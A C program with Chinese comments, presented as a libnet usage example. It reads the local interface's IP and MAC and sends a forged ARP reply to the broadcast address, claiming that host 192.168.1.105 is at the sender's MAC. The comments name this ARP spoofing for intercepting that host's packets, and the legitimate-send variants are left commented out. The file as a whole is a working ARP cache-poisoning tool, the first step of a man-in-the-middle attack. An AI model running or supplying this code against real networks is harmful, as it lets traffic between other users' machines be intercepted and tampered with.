#include <libnet.h>
#include <stdio.h>
#include <arpa/inet.h>
/**
	libnet的使用
*/

typedef struct libnet_ether_addr lib_mac_addr;

int main(){
	char errbuf[LIBNET_ERRBUF_SIZE];
	//创建libnet实例
	libnet_t* libnet_context;
	uint32_t src_ip;
	uint8_t dst_ip[]={192,168,1,7};
	//uint8_t dst_mac[]={0x8c,0x32,0x23,0x0f,0xea,0xd5};
	uint8_t dst_mac[]={0xff,0xff,0xff,0xff,0xff,0xff};
	char * dev_name = NULL;
	lib_mac_addr* mac_addr;
	if(!(libnet_context = libnet_init(LIBNET_LINK_ADV,dev_name,errbuf))){
		perror(errbuf);
		goto close_resorce;
	}
	//获取libnet加载的网卡的IP、MAC
	//成功，返回一个大端序的IP地址，失败返回-1
	if((src_ip  = libnet_get_ipaddr4(libnet_context))  == (uint32_t)(-1)){
		fprintf(stderr,"get ip error:%s\n",libnet_geterror(libnet_context));
		goto close_resorce;
	}
	//struct libnet_ether_addr * libnet_get_hwaddr (libnet_t *l)
	if(!(mac_addr = libnet_get_hwaddr(libnet_context))){
		fprintf(stderr,"get hw addr error:%s\n",libnet_geterror(libnet_context));
		goto close_resorce;
	}
	char ip_str[INET_ADDRSTRLEN];
	printf("src ip = %s\n",inet_ntop(AF_INET,&src_ip,ip_str,INET_ADDRSTRLEN));
	//可以将获取的mac地址结构体指针强转成uint8_t指针获取mac
	//或者直接通过：mac_addr->ether_addr_octet[i]获取mac地址每一位
	printf("mac=%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",mac_addr->ether_addr_octet[0],mac_addr->ether_addr_octet[1],((uint8_t*)mac_addr)[2],((uint8_t*)mac_addr)[3],
		mac_addr->ether_addr_octet[4],mac_addr->ether_addr_octet[5]);
	//组arp包 : ARPOP_REPLY 
	uint8_t padding[18]={0},init_mac[6]={0},cheat_ip[4]={192,168,1,105};
	//arp欺骗：将源ip换成要拦截包的主机IP，这里以192.168.1.105为例
	
	libnet_ptag_t ptag ;
	//arp欺骗设置的ip
	ptag = libnet_autobuild_arp(ARPOP_REPLY,(uint8_t*)&mac_addr->ether_addr_octet,cheat_ip,dst_mac,dst_ip,libnet_context);
	//正常发包设置的源ip地址
	//ptag = libnet_autobuild_arp(ARPOP_REPLY,(uint8_t*)&mac_addr->ether_addr_octet,(uint8_t*)&src_ip,dst_mac,dst_ip,libnet_context);
	//ptag = libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REQUEST,(uint8_t*)&mac_addr->ether_addr_octet,(uint8_t*)&src_ip,init_mac,dst_ip,padding,sizeof(padding),libnet_context,0);
	if(ptag == -1){
		fprintf(stderr,"build arp error:%s\n",libnet_geterror(libnet_context));
		goto close_resorce;
	}
	//组以太网头部
	ptag = libnet_build_ethernet(dst_mac,(uint8_t*)&mac_addr->ether_addr_octet,ETHERTYPE_ARP,NULL,0,libnet_context,0);
	if(ptag == -1){
		fprintf(stderr,"build ethernet frame error:%s\n",libnet_geterror(libnet_context));
		goto close_resorce;
	}
	uint32_t packet_s;
	/*
	uint8_t *packet;
	//拷贝组好的数据包到packet指针所在地址，并将包长度放到packet_s的内存
	
	if(libnet_adv_cull_packet(libnet_context,&packet,&packet_s) == -1){
		printf("cull packet error:%s\n",libnet_geterror(libnet_context));
		goto close_resorce;
	}
	printf("packet len = %d\n",packet_s);
	//打印一下这个包
	int j=0;
	for(int i=0;i<packet_s;++i){
		printf("%.2x  ",packet[i]);
		j++;
		if(j==16){
			printf("\n");
			j=0;
		}
	}
	printf("\n");
	//一定要注意释放libnet_adv_cull_packet函数内malloc的内存。
	libnet_adv_free_packet(libnet_context,packet);
	*/
	if((packet_s = libnet_write(libnet_context)) == -1){
		printf("send message error:%s\n",libnet_geterror(libnet_context));
		goto close_resorce;
	}
close_resorce:
	if(libnet_context)
		libnet_destroy(libnet_context);
	return 0;
}
